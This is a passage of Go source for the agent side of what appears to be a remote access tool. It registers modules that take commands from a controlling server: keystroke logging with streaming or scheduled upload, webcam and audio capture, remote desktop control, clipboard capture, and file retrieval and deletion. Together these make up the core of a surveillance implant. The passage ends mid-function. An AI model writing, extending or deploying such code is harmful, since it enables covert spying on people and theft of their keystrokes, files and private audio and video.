package agent

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	appvnc "github.com/rootbay/tenvy-client/internal/modules/control/appvnc"
	audioctrl "github.com/rootbay/tenvy-client/internal/modules/control/audio"
	keyloggerctrl "github.com/rootbay/tenvy-client/internal/modules/control/keylogger"
	remotedesktop "github.com/rootbay/tenvy-client/internal/modules/control/remotedesktop"
	webcamctrl "github.com/rootbay/tenvy-client/internal/modules/control/webcam"
	clipboard "github.com/rootbay/tenvy-client/internal/modules/management/clipboard"
	environmentmgr "github.com/rootbay/tenvy-client/internal/modules/management/environment"
	filemanager "github.com/rootbay/tenvy-client/internal/modules/management/filemanager"
	registrymgr "github.com/rootbay/tenvy-client/internal/modules/management/registry"
	startupmgr "github.com/rootbay/tenvy-client/internal/modules/management/startup"
	taskmanager "github.com/rootbay/tenvy-client/internal/modules/management/taskmanager"
	tcpconnections "github.com/rootbay/tenvy-client/internal/modules/management/tcpconnections"
	clientchat "github.com/rootbay/tenvy-client/internal/modules/misc/clientchat"
	geolocationmgr "github.com/rootbay/tenvy-client/internal/modules/misc/geolocation"
	triggermgr "github.com/rootbay/tenvy-client/internal/modules/misc/trigger"
	notes "github.com/rootbay/tenvy-client/internal/modules/notes"
	recovery "github.com/rootbay/tenvy-client/internal/modules/operations/recovery"
	systeminfo "github.com/rootbay/tenvy-client/internal/modules/systeminfo"
	"github.com/rootbay/tenvy-client/internal/plugins"
	"github.com/rootbay/tenvy-client/internal/protocol"
	manifest "github.com/rootbay/tenvy-client/shared/pluginmanifest"
)

type appVncModule struct {
	controller *appvnc.Controller
}

func (m *appVncModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "app-vnc",
		Title:       "Application VNC",
		Description: "Launches curated applications inside a disposable workspace and streams them through VNC.",
		Commands:    []string{"app-vnc"},
		Capabilities: []ModuleCapability{
			{
				ID:          "app-vnc.launch",
				Name:        "app-vnc.launch",
				Description: "Clone per-application profiles and start virtualized sessions.",
			},
		},
	}
}

func (m *appVncModule) ID() string {
	return "app-vnc"
}

func (m *appVncModule) ensureController() *appvnc.Controller {
	if m.controller == nil {
		m.controller = appvnc.NewController()
	}
	return m.controller
}

func (m *appVncModule) Init(_ context.Context, cfg Config) error {
	return m.configure(cfg)
}

func (m *appVncModule) configure(cfg Config) error {
	controller := m.ensureController()
	root := filepath.Join(os.TempDir(), "tenvy-appvnc")
	if err := os.MkdirAll(root, 0o755); err != nil {
		return fmt.Errorf("prepare app-vnc workspace root: %w", err)
	}
	controller.Update(appvnc.Config{
		Logger:        cfg.Logger,
		WorkspaceRoot: root,
		AgentID:       cfg.AgentID,
		BaseURL:       cfg.BaseURL,
		AuthKey:       cfg.AuthKey,
		Client:        cfg.HTTPClient,
		UserAgent:     cfg.UserAgent,
	})
	return nil
}

func (m *appVncModule) UpdateConfig(cfg Config) error {
	return m.configure(cfg)
}

func (m *appVncModule) Handle(ctx context.Context, cmd protocol.Command) error {
	controller := m.ensureController()
	if controller == nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "app-vnc controller unavailable",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		})
	}
	return WrapCommandResult(controller.HandleCommand(ctx, cmd))
}

func (m *appVncModule) HandleInputBurst(ctx context.Context, burst protocol.AppVncInputBurst) error {
	controller := m.ensureController()
	if controller == nil {
		return fmt.Errorf("app-vnc controller unavailable")
	}
	return controller.HandleInputBurst(ctx, burst)
}

func (m *appVncModule) Shutdown(ctx context.Context) error {
	if m.controller != nil {
		m.controller.Shutdown(ctx)
	}
	return nil
}

type remoteDesktopEngineFactory func(context.Context, Config, remotedesktop.Config) (remotedesktop.Engine, string, error)

type remoteDesktopModule struct {
	mu              sync.Mutex
	engine          remotedesktop.Engine
	engineConfig    remotedesktop.Config
	factory         remoteDesktopEngineFactory
	requiredVersion string
	extensions      map[string]ModuleExtension
	telemetryOnce   sync.Once
	telemetry       *moduleTelemetryRegistry
}

func newRemoteDesktopModule(engine remotedesktop.Engine) *remoteDesktopModule {
	module := &remoteDesktopModule{factory: defaultRemoteDesktopEngineFactory}
	if engine != nil {
		module.engine = engine
	}
	return module
}

func (m *remoteDesktopModule) Metadata() ModuleMetadata {
	metadata := ModuleMetadata{
		ID:          "remote-desktop",
		Title:       "Remote Desktop",
		Description: "Interactive remote desktop streaming and control.",
		Commands:    []string{"remote-desktop"},
		Capabilities: []ModuleCapability{
			{
				ID:          "remote-desktop.stream",
				Name:        "Desktop streaming",
				Description: "Stream high-fidelity desktop frames to the controller UI.",
			},
			{
				ID:          "remote-desktop.input",
				Name:        "Input relay",
				Description: "Relay keyboard and pointer events back to the remote host.",
			},
		},
	}
	if descriptor, ok := manifest.LookupTelemetry("remote-desktop.metrics"); ok {
		metadata.Telemetry = append(metadata.Telemetry, ModuleTelemetryDescriptor{
			ID:          descriptor.ID,
			Name:        descriptor.Name,
			Description: descriptor.Description,
		})
	}
	return metadata
}

func (m *remoteDesktopModule) ID() string {
	return "remote-desktop"
}

func (m *remoteDesktopModule) Init(ctx context.Context, cfg Config) error {
	return m.configure(ctx, cfg)
}

func (m *remoteDesktopModule) UpdateConfig(cfg Config) error {
	return m.configure(context.Background(), cfg)
}

func (m *remoteDesktopModule) RegisterExtension(extension ModuleExtension) error {
	source := strings.TrimSpace(extension.Source)
	if source == "" {
		return fmt.Errorf("extension source required")
	}

	m.mu.Lock()
	defer m.mu.Unlock()

	if m.extensions == nil {
		m.extensions = make(map[string]ModuleExtension)
	}
	m.extensions[source] = copyModuleExtension(extension)
	return nil
}

func (m *remoteDesktopModule) UnregisterExtension(source string) error {
	source = strings.TrimSpace(source)

	m.mu.Lock()
	defer m.mu.Unlock()

	if len(m.extensions) == 0 {
		return nil
	}
	if source == "" {
		m.extensions = nil
		return nil
	}
	delete(m.extensions, source)
	if len(m.extensions) == 0 {
		m.extensions = nil
	}
	return nil
}

func (m *remoteDesktopModule) telemetryRegistry() *moduleTelemetryRegistry {
	if m == nil {
		return nil
	}
	m.telemetryOnce.Do(func() {
		if m.telemetry == nil {
			m.telemetry = newModuleTelemetryRegistry()
		}
	})
	return m.telemetry
}

func (m *remoteDesktopModule) RegisterTelemetry(source string, descriptors []ModuleTelemetryDescriptor) error {
	registry := m.telemetryRegistry()
	if registry == nil {
		return nil
	}
	return registry.register(source, descriptors)
}

func (m *remoteDesktopModule) UnregisterTelemetry(source string) error {
	if m == nil || m.telemetry == nil {
		return nil
	}
	return m.telemetry.unregister(source)
}

func (m *remoteDesktopModule) configure(ctx context.Context, runtime Config) error {
	var requestTimeout time.Duration
	if runtime.HTTPClient != nil {
		requestTimeout = runtime.HTTPClient.Timeout
	}
	cfg := remotedesktop.Config{
		AgentID:        runtime.AgentID,
		BaseURL:        runtime.BaseURL,
		AuthKey:        runtime.AuthKey,
		Client:         runtime.HTTPClient,
		Logger:         runtime.Logger,
		UserAgent:      runtime.UserAgent,
		RequestTimeout: requestTimeout,
	}
	cfg.QUICInput.URL = os.Getenv("TENVY_REMOTE_DESKTOP_QUIC_URL")
	cfg.QUICInput.Token = os.Getenv("TENVY_REMOTE_DESKTOP_QUIC_TOKEN")
	cfg.QUICInput.ALPN = os.Getenv("TENVY_REMOTE_DESKTOP_QUIC_ALPN")
	cfg.QUICInput.Disabled = envBool("TENVY_REMOTE_DESKTOP_QUIC_DISABLED")
	if d := envDuration("TENVY_REMOTE_DESKTOP_QUIC_CONNECT_TIMEOUT"); d > 0 {
		cfg.QUICInput.ConnectTimeout = d
	}
	if d := envDuration("TENVY_REMOTE_DESKTOP_QUIC_RETRY_INTERVAL"); d > 0 {
		cfg.QUICInput.RetryInterval = d
	}
	if v := strings.TrimSpace(os.Getenv("TENVY_REMOTE_DESKTOP_QUIC_INSECURE")); strings.EqualFold(v, "1") || strings.EqualFold(v, "true") || strings.EqualFold(v, "yes") || strings.EqualFold(v, "on") {
		if runtime.Logger != nil {
			runtime.Logger.Printf("remote desktop: TENVY_REMOTE_DESKTOP_QUIC_INSECURE is no longer supported; TLS validation remains enabled")
		}
	}
	if path := strings.TrimSpace(os.Getenv("TENVY_REMOTE_DESKTOP_QUIC_ROOT_CA_FILE")); path != "" {
		cfg.QUICInput.RootCAFiles = append(cfg.QUICInput.RootCAFiles, path)
	}
	cfg.QUICInput.RootCAFiles = append(cfg.QUICInput.RootCAFiles, envList("TENVY_REMOTE_DESKTOP_QUIC_ROOT_CA_FILES")...)
	if pem := strings.TrimSpace(os.Getenv("TENVY_REMOTE_DESKTOP_QUIC_ROOT_CA_PEM")); pem != "" {
		cfg.QUICInput.RootCAPEMs = append(cfg.QUICInput.RootCAPEMs, pem)
	}
	cfg.QUICInput.RootCAPEMs = append(cfg.QUICInput.RootCAPEMs, envList("TENVY_REMOTE_DESKTOP_QUIC_ROOT_CA_PEMS")...)
	cfg.QUICInput.PinnedSPKIHashes = append(cfg.QUICInput.PinnedSPKIHashes, envList("TENVY_REMOTE_DESKTOP_QUIC_SPKI_HASHES")...)
	cfg.QUICInput.PinnedSPKIHashes = append(cfg.QUICInput.PinnedSPKIHashes, envList("TENVY_REMOTE_DESKTOP_QUIC_PINNED_SPKI_HASHES")...)
	m.mu.Lock()
	factory := m.factory
	engine := m.engine
	version := strings.TrimSpace(m.requiredVersion)
	m.mu.Unlock()

	if version != "" {
		cfg.PluginVersion = version
	}

	if engine == nil {
		if factory == nil {
			factory = defaultRemoteDesktopEngineFactory
		}
		created, stagedVersion, err := factory(ctx, runtime, cfg)
		if err != nil {
			return err
		}
		stagedVersion = strings.TrimSpace(stagedVersion)
		if stagedVersion != "" {
			cfg.PluginVersion = stagedVersion
		}
		if err := created.Configure(cfg); err != nil {
			return err
		}
		m.mu.Lock()
		m.engine = created
		m.engineConfig = cfg
		if stagedVersion != "" {
			m.requiredVersion = stagedVersion
		}
		m.mu.Unlock()
		return nil
	}

	if err := engine.Configure(cfg); err != nil {
		return err
	}
	m.mu.Lock()
	m.engineConfig = cfg
	m.mu.Unlock()
	return nil
}

func (m *remoteDesktopModule) Handle(ctx context.Context, cmd protocol.Command) error {
	engine := m.currentEngine()
	if engine == nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "remote desktop subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		})
	}
	payload, err := remotedesktop.DecodeCommandPayload(cmd.Payload)
	if err != nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       err.Error(),
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		})
	}

	var actionErr error
	switch strings.ToLower(strings.TrimSpace(payload.Action)) {
	case "start":
		actionErr = engine.StartSession(ctx, payload)
	case "stop":
		actionErr = engine.StopSession(payload.SessionID)
	case "configure":
		actionErr = engine.UpdateSession(payload)
	case "input":
		actionErr = engine.HandleInput(ctx, payload)
	default:
		actionErr = fmt.Errorf("unsupported remote desktop action: %s", payload.Action)
	}

	result := protocol.CommandResult{
		CommandID:   cmd.ID,
		CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
	}
	if actionErr != nil {
		result.Success = false
		result.Error = actionErr.Error()
	} else {
		result.Success = true
		result.Output = fmt.Sprintf("remote desktop %s action processed", payload.Action)
	}
	return WrapCommandResult(result)
}

func (m *remoteDesktopModule) HandleInputBurst(ctx context.Context, burst protocol.RemoteDesktopInputBurst) error {
	engine := m.currentEngine()
	if engine == nil {
		return fmt.Errorf("remote desktop subsystem not initialized")
	}
	if len(burst.Events) == 0 {
		return nil
	}

	events := make([]remotedesktop.RemoteDesktopInputEvent, 0, len(burst.Events))
	for _, evt := range burst.Events {
		event := remotedesktop.RemoteDesktopInputEvent{
			Type:       remotedesktop.RemoteDesktopInputType(evt.Type),
			CapturedAt: evt.CapturedAt,
			X:          evt.X,
			Y:          evt.Y,
			Normalized: evt.Normalized,
			Monitor:    evt.Monitor,
			Button:     remotedesktop.RemoteDesktopMouseButton(evt.Button),
			Pressed:    evt.Pressed,
			DeltaX:     evt.DeltaX,
			DeltaY:     evt.DeltaY,
			DeltaMode:  evt.DeltaMode,
			Key:        evt.Key,
			Code:       evt.Code,
			KeyCode:    evt.KeyCode,
			Repeat:     evt.Repeat,
			AltKey:     evt.AltKey,
			CtrlKey:    evt.CtrlKey,
			ShiftKey:   evt.ShiftKey,
			MetaKey:    evt.MetaKey,
		}
		events = append(events, event)
	}

	payload := remotedesktop.RemoteDesktopCommandPayload{
		Action:    "input",
		SessionID: burst.SessionID,
		Events:    events,
	}

	return engine.HandleInput(ctx, payload)
}

func (m *remoteDesktopModule) Shutdown(context.Context) error {
	engine := m.currentEngine()
	if engine != nil {
		engine.Shutdown()
	}
	return nil
}

func (m *remoteDesktopModule) currentEngine() remotedesktop.Engine {
	m.mu.Lock()
	defer m.mu.Unlock()
	return m.engine
}

func defaultRemoteDesktopEngineFactory(ctx context.Context, runtime Config, cfg remotedesktop.Config) (remotedesktop.Engine, string, error) {
	manager := runtime.Plugins
	client := runtime.HTTPClient
	baseURL := strings.TrimSpace(runtime.BaseURL)
	agentID := strings.TrimSpace(runtime.AgentID)

	fallback := func() (remotedesktop.Engine, string, error) {
		engine := remotedesktop.NewRemoteDesktopStreamer(cfg)
		return engine, "", nil
	}

	if manager == nil || client == nil || baseURL == "" || agentID == "" {
		return fallback()
	}

	descriptor, ok := runtime.PluginManifests[plugins.RemoteDesktopEnginePluginID]
	if !ok {
		if runtime.Logger != nil {
			runtime.Logger.Printf("remote desktop: manifest descriptor unavailable")
		}
		return fallback()
	}

	stageCtx := ctx
	if stageCtx == nil {
		stageCtx = context.Background()
	}

	stageCtx, cancel := context.WithTimeout(stageCtx, 30*time.Second)
	defer cancel()

	var metadata protocol.AgentMetadata
	if runtime.Provider != nil {
		metadata = runtime.Provider.AgentMetadata()
	}
	agentVersion := strings.TrimSpace(runtime.BuildVersion)
	if agentVersion == "" {
		agentVersion = strings.TrimSpace(metadata.Version)
	}
	facts := manifest.RuntimeFacts{
		Platform:       metadata.OS,
		Architecture:   metadata.Architecture,
		AgentVersion:   agentVersion,
		EnabledModules: append([]string(nil), runtime.ActiveModules...),
	}

	result, err := plugins.StageRemoteDesktopEngine(stageCtx, manager, client, baseURL, agentID, runtime.AuthKey, runtime.UserAgent, facts, descriptor)
	if err != nil {
		if runtime.Logger != nil {
			runtime.Logger.Printf("remote desktop: engine staging failed: %v", err)
		}
		return fallback()
	}

	version := strings.TrimSpace(result.Manifest.Version)
	if runtime.Extensions != nil {
		var caps []ModuleCapability
		for _, capabilityID := range result.Manifest.Capabilities {
			descriptor, ok := manifest.LookupCapability(capabilityID)
			if !ok {
				continue
			}
			if !strings.EqualFold(descriptor.Module, "remote-desktop") {
				continue
			}
			caps = append(caps, ModuleCapability{
				ID:          descriptor.ID,
				Name:        descriptor.Name,
				Description: descriptor.Description,
			})
		}
		if len(caps) > 0 {
			extension := ModuleExtension{
				Source:       strings.TrimSpace(result.Manifest.ID),
				Version:      version,
				Capabilities: caps,
			}
			if err := runtime.Extensions.RegisterModuleExtension("remote-desktop", extension); err != nil && runtime.Logger != nil {
				runtime.Logger.Printf("remote desktop: failed to register plugin capabilities: %v", err)
			}
		}
	}
	engine := remotedesktop.NewManagedRemoteDesktopEngine(result.EntryPath, version, manager, runtime.Logger)
	return engine, version, nil
}

var (
	audioModuleBaseCapabilities          = []string{"audio.capture", "audio.inject"}
	keyloggerModuleBaseCapabilities      = []string{"keylogger.stream", "keylogger.batch"}
	webcamModuleBaseCapabilities         = []string{"webcam.enumerate", "webcam.stream"}
	clipboardModuleBaseCapabilities      = []string{"clipboard.capture", "clipboard.push"}
	fileManagerModuleBaseCapabilities    = []string{"file-manager.explore", "file-manager.modify"}
	taskManagerModuleBaseCapabilities    = []string{"task-manager.list", "task-manager.control"}
	tcpConnectionsModuleBaseCapabilities = []string{"tcp-connections.enumerate", "tcp-connections.control"}
	clientChatModuleBaseCapabilities     = []string{"client-chat.persistent", "client-chat.alias"}
	systemInfoModuleBaseCapabilities     = []string{"system-info.snapshot", "system-info.telemetry"}
	environmentModuleBaseCapabilities    = []string{"environment.inspect", "environment.modify"}
	triggerMonitorModuleBaseCapabilities = []string{"trigger-monitor.observe", "trigger-monitor.configure"}
	geoModuleBaseCapabilities            = []string{"ip-geolocation.lookup", "ip-geolocation.providers"}
)

func newClipboardModule() *clipboardModule           { return &clipboardModule{} }
func newFileManagerModule() *fileManagerModule       { return &fileManagerModule{} }
func newEnvironmentModule() *environmentModule       { return &environmentModule{} }
func newTaskManagerModule() *taskManagerModule       { return &taskManagerModule{} }
func newTCPConnectionsModule() *tcpConnectionsModule { return &tcpConnectionsModule{} }
func newClientChatModule() *clientChatModule         { return &clientChatModule{} }
func newTriggerMonitorModule() *triggerMonitorModule { return &triggerMonitorModule{} }
func newGeoModule() *geoModule                       { return &geoModule{} }
func newSystemInfoModule() *systemInfoModule         { return &systemInfoModule{} }

type keyloggerModule struct {
	BaseModule
	manager *keyloggerctrl.Manager
}

type webcamModule struct {
	BaseModule
	manager *webcamctrl.Manager
}

func newWebcamModule() *webcamModule {
	return &webcamModule{
		BaseModule: *NewBaseModule("webcam-control", webcamModuleBaseCapabilities),
	}
}

func (m *webcamModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "webcam-control",
		Title:       "Webcam Control",
		Description: "Enumerate and control remote webcam devices.",
		Commands:    []string{"webcam-control"},
		Capabilities: []ModuleCapability{
			{
				ID:          "webcam.enumerate",
				Name:        "webcam.enumerate",
				Description: "Enumerate connected webcam devices and capabilities.",
			},
			{
				ID:          "webcam.stream",
				Name:        "webcam.stream",
				Description: "Initiate webcam streaming sessions when supported.",
			},
		},
	}
}

func (m *webcamModule) Init(ctx context.Context, cfg Config) error {
	m.BaseModule.Init(ctx, cfg)
	return m.configure(cfg)
}

func (m *webcamModule) UpdateConfig(cfg Config) error {
	m.BaseModule.UpdateConfig(cfg)
	return m.configure(cfg)
}

func (m *webcamModule) configure(runtime Config) error {
	cfg := webcamctrl.Config{
		AgentID:   runtime.AgentID,
		BaseURL:   runtime.BaseURL,
		AuthKey:   runtime.AuthKey,
		Client:    runtime.HTTPClient,
		Logger:    runtime.Logger,
		UserAgent: runtime.UserAgent,
	}
	if m.manager == nil {
		m.manager = webcamctrl.NewManager(cfg)
		return nil
	}
	m.manager.UpdateConfig(cfg)
	return nil
}

func (m *webcamModule) Handle(ctx context.Context, cmd protocol.Command) error {
	if m.manager == nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "webcam subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		})
	}
	if len(cmd.Payload) > 0 {
		var payload protocol.WebcamCommandPayload
		if err := json.Unmarshal(cmd.Payload, &payload); err == nil {
			action := strings.TrimSpace(strings.ToLower(payload.Action))
			switch action {
			case "", "enumerate", "inventory":
				if err := m.HandleCapabilityCheck(cmd, "webcam.enumerate"); err != nil {
					return err
				}
			case "start", "stop", "update":
				if err := m.HandleCapabilityCheck(cmd, "webcam.stream"); err != nil {
					return err
				}
			}
		}
	}
	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
}

func (m *webcamModule) Shutdown(context.Context) error {
	return nil
}

type audioModule struct {
	BaseModule
	bridge *audioctrl.AudioBridge
}

func newAudioModule() *audioModule {
	return &audioModule{
		BaseModule: *NewBaseModule("audio-control", audioModuleBaseCapabilities),
	}
}

func (m *audioModule) Metadata() ModuleMetadata {
	metadata := ModuleMetadata{
		ID:          "audio-control",
		Title:       "Audio Control",
		Description: "Capture and inject audio streams across the remote session.",
		Commands:    []string{"audio-control"},
		Capabilities: []ModuleCapability{
			{
				ID:          "audio.capture",
				Name:        "Audio capture",
				Description: "Capture remote system audio for monitoring and recording.",
			},
			{
				ID:          "audio.inject",
				Name:        "Audio injection",
				Description: "Inject operator-provided audio streams into the remote session.",
			},
		},
	}
	if descriptor, ok := manifest.LookupTelemetry("audio.telemetry"); ok {
		metadata.Telemetry = append(metadata.Telemetry, ModuleTelemetryDescriptor{
			ID:          descriptor.ID,
			Name:        descriptor.Name,
			Description: descriptor.Description,
		})
	}
	return metadata
}

func (m *audioModule) Init(ctx context.Context, cfg Config) error {
	m.BaseModule.Init(ctx, cfg)
	return m.configure(cfg)
}

func (m *audioModule) UpdateConfig(cfg Config) error {
	m.BaseModule.UpdateConfig(cfg)
	return m.configure(cfg)
}

func (m *audioModule) configure(runtime Config) error {
	cfg := audioctrl.Config{
		AgentID:   runtime.AgentID,
		BaseURL:   runtime.BaseURL,
		AuthKey:   runtime.AuthKey,
		Client:    runtime.HTTPClient,
		Logger:    runtime.Logger,
		UserAgent: runtime.UserAgent,
	}
	if m.bridge == nil {
		m.bridge = audioctrl.NewAudioBridge(cfg)
		return nil
	}
	m.bridge.UpdateConfig(cfg)
	return nil
}

func (m *audioModule) Handle(ctx context.Context, cmd protocol.Command) error {
	if m.bridge == nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "audio subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		})
	}
	if len(cmd.Payload) > 0 {
		var payload audioctrl.AudioControlCommandPayload
		if err := json.Unmarshal(cmd.Payload, &payload); err == nil {
			action := strings.ToLower(strings.TrimSpace(payload.Action))
			switch action {
			case "", "enumerate", "inventory":
				if err := m.HandleCapabilityCheck(cmd, "audio.capture"); err != nil {
					return err
				}
			case "start":
				direction := payload.Direction
				if direction == "" {
					direction = audioctrl.AudioDirectionInput
				}
				required := "audio.capture"
				if direction == audioctrl.AudioDirectionOutput {
					required = "audio.inject"
				}
				if err := m.HandleCapabilityCheck(cmd, required); err != nil {
					return err
				}
			case "stop":
				if err := m.HandleCapabilityCheck(cmd, "audio.capture", "audio.inject"); err != nil {
					return err
				}
			case "playback-start", "playback-pause", "playback-resume", "playback-stop":
				if err := m.HandleCapabilityCheck(cmd, "audio.inject"); err != nil {
					return err
				}
			}
		}
	}
	return WrapCommandResult(m.bridge.HandleCommand(ctx, cmd))
}

func (m *audioModule) Shutdown(context.Context) error {
	if m.bridge != nil {
		m.bridge.Shutdown()
	}
	return nil
}

func newKeyloggerModule() *keyloggerModule {
	return &keyloggerModule{
		BaseModule: *NewBaseModule("keylogger", keyloggerModuleBaseCapabilities),
	}
}

func (m *keyloggerModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "keylogger",
		Title:       "Keylogger",
		Description: "Capture keystrokes and related telemetry from the remote host.",
		Commands:    []string{"keylogger.start", "keylogger.stop"},
		Capabilities: []ModuleCapability{
			{
				ID:          "keylogger.stream",
				Name:        "keylogger.stream",
				Description: "Stream keystroke telemetry to the controller in near real time.",
			},
			{
				ID:          "keylogger.batch",
				Name:        "keylogger.batch",
				Description: "Batch keystrokes offline and upload on a schedule.",
			},
		},
	}
}

func (m *keyloggerModule) Init(ctx context.Context, cfg Config) error {
	m.BaseModule.Init(ctx, cfg)
	return m.configure(cfg)
}

func (m *keyloggerModule) UpdateConfig(cfg Config) error {
	m.BaseModule.UpdateConfig(cfg)
	return m.configure(cfg)
}

func (m *keyloggerModule) configure(runtime Config) error {
	cfg := keyloggerctrl.Config{
		AgentID:   runtime.AgentID,
		BaseURL:   runtime.BaseURL,
		AuthKey:   runtime.AuthKey,
		Client:    runtime.HTTPClient,
		Logger:    runtime.Logger,
		UserAgent: runtime.UserAgent,
	}
	if m.manager == nil {
		m.manager = keyloggerctrl.NewManager(cfg)
		return nil
	}
	m.manager.UpdateConfig(cfg)
	return nil
}

func (m *keyloggerModule) Handle(ctx context.Context, cmd protocol.Command) error {
	if m.manager == nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "keylogger subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		})
	}
	if len(cmd.Payload) > 0 {
		var payload keyloggerctrl.CommandPayload
		if err := json.Unmarshal(cmd.Payload, &payload); err == nil {
			action := strings.TrimSpace(strings.ToLower(payload.Action))
			if action == "" {
				switch strings.ToLower(strings.TrimSpace(cmd.Name)) {
				case "keylogger.start":
					action = "start"
				case "keylogger.stop":
					action = "stop"
				}
			}
			switch action {
			case "start":
				mode := payload.Mode
				if payload.Config != nil && payload.Config.Mode != "" {
					mode = payload.Config.Mode
				}
				if mode == keyloggerctrl.ModeOffline {
					if err := m.HandleCapabilityCheck(cmd, "keylogger.batch"); err != nil {
						return err
					}
				} else {
					if err := m.HandleCapabilityCheck(cmd, "keylogger.stream"); err != nil {
						return err
					}
				}
			case "stop":
				if err := m.HandleCapabilityCheck(cmd, "keylogger.stream", "keylogger.batch"); err != nil {
					return err
				}
			}
		}
	}
	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
}

func (m *keyloggerModule) Shutdown(context.Context) error {
	if m.manager != nil {
		m.manager.Shutdown(context.Background())
	}
	return nil
}

type clipboardModule struct {
	manager    *clipboard.Manager
	extensions *moduleExtensionState
	extOnce    sync.Once
}

func (m *clipboardModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "clipboard",
		Title:       "Clipboard Manager",
		Description: "Synchronize clipboard data between the operator and remote host.",
		Commands:    []string{"clipboard"},
		Capabilities: []ModuleCapability{
			{
				ID:          "clipboard.capture",
				Name:        "Clipboard capture",
				Description: "Capture clipboard changes emitted by the remote workstation.",
			},
			{
				ID:          "clipboard.push",
				Name:        "Clipboard push",
				Description: "Push operator clipboard payloads to the remote host.",
			},
		},
	}
}

func (m *clipboardModule) ID() string {
	return "clipboard"
}

func (m *clipboardModule) Init(_ context.Context, cfg Config) error {
	return m.configure(cfg)
}

func (m *clipboardModule) UpdateConfig(cfg Config) error {
	return m.configure(cfg)
}

func (m *clipboardModule) extensionState() *moduleExtensionState {
	m.extOnce.Do(func() {
		m.extensions = newModuleExtensionState(clipboardModuleBaseCapabilities)
	})
	return m.extensions
}

func (m *clipboardModule) RegisterExtension(extension ModuleExtension) error {
	return m.extensionState().register(extension)
}

func (m *clipboardModule) UnregisterExtension(source string) error {
	return m.extensionState().unregister(source)
}

func (m *clipboardModule) configure(runtime Config) error {
	cfg := clipboard.Config{
		AgentID:   runtime.AgentID,
		BaseURL:   runtime.BaseURL,
		AuthKey:   runtime.AuthKey,
		Client:    runtime.HTTPClient,
		Logger:    runtime.Logger,
		UserAgent: runtime.UserAgent,
	}
	if m.manager == nil {
		m.manager = clipboard.NewManager(cfg)
		return nil
	}
	m.manager.UpdateConfig(cfg)
	return nil
}

func (m *clipboardModule) Handle(ctx context.Context, cmd protocol.Command) error {
	if m.manager == nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "clipboard subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		})
	}
	state := m.extensionState()
	if len(cmd.Payload) > 0 {
		var payload clipboard.ClipboardCommandPayload
		if err := json.Unmarshal(cmd.Payload, &payload); err == nil {
			action := strings.TrimSpace(strings.ToLower(payload.Action))
			switch action {
			case "get", "":
				if !state.hasCapability("clipboard.capture") {
					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "clipboard.capture"))
				}
			case "set":
				if !state.hasCapability("clipboard.push") {
					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "clipboard.push"))
				}
			case "sync-triggers":
				if !state.hasCapability("clipboard.capture") {
					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "clipboard.capture"))
				}
			}
		}
	}
	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
}

func (m *clipboardModule) Shutdown(context.Context) error {
	if m.manager != nil {
		m.manager.Shutdown()
	}
	return nil
}

type fileManagerModule struct {
	manager    *filemanager.Manager
	extensions *moduleExtensionState
	extOnce    sync.Once
}

func (m *fileManagerModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "file-manager",
		Title:       "File Manager",
		Description: "Inspect and manage the remote file system.",
		Commands:    []string{"file-manager"},
		Capabilities: []ModuleCapability{
			{
				ID:          "file-manager.explore",
				Name:        "file-manager.explore",
				Description: "Enumerate directories and retrieve file contents from the host.",
			},
			{
				ID:          "file-manager.modify",
				Name:        "file-manager.modify",
				Description: "Create, update, move, and delete files and directories on demand.",
			},
		},
	}
}

func (m *fileManagerModule) ID() string {
	return "file-manager"
}

func (m *fileManagerModule) Init(_ context.Context, cfg Config) error {
	return m.configure(cfg)
}

func (m *fileManagerModule) UpdateConfig(cfg Config) error {
	return m.configure(cfg)
}

func (m *fileManagerModule) extensionState() *moduleExtensionState {
	m.extOnce.Do(func() {
		m.extensions = newModuleExtensionState(fileManagerModuleBaseCapabilities)
	})
	return m.extensions
}

func (m *fileManagerModule) RegisterExtension(extension ModuleExtension) error {
	return m.extensionState().register(extension)
}

func (m *fileManagerModule) UnregisterExtension(source string) error {
	return m.extensionState().unregister(source)
}

func (m *fileManagerModule) configure(runtime Config) error {
	cfg := filemanager.Config{
		AgentID:   runtime.AgentID,
		BaseURL:   runtime.BaseURL,
		AuthKey:   runtime.AuthKey,
		Client:    runtime.HTTPClient,
		Logger:    runtime.Logger,
		UserAgent: runtime.UserAgent,
	}
	if m.manager == nil {
		m.manager = filemanager.NewManager(cfg)
		return nil
	}
	m.manager.UpdateConfig(cfg)
	return nil
}

func (m *fileManagerModule) Handle(ctx context.Context, cmd protocol.Command) error {
	if m.manager == nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "file manager subsystem not initialized",
